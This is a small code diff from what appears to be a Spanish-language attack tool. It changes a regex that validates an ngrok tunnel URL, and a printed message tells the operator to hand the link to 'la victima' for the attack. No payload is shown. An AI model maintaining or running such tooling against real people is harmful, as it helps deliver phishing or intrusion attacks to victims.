@@ -889,7 +889,7 @@ def runNgrok():
         urlFile = open('Server/Datos/ngrok.txt', 'r')
         url = urlFile.read()
         urlFile.close()
-        if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
+        if re.match("https://[0-9a-z].*\.ngrok.io", url) != None:
             print(""+Green+"\n [+] Url de Ngrok : " + url + "\n Pasale el link a la victima para el ataque \n")
             break
 		
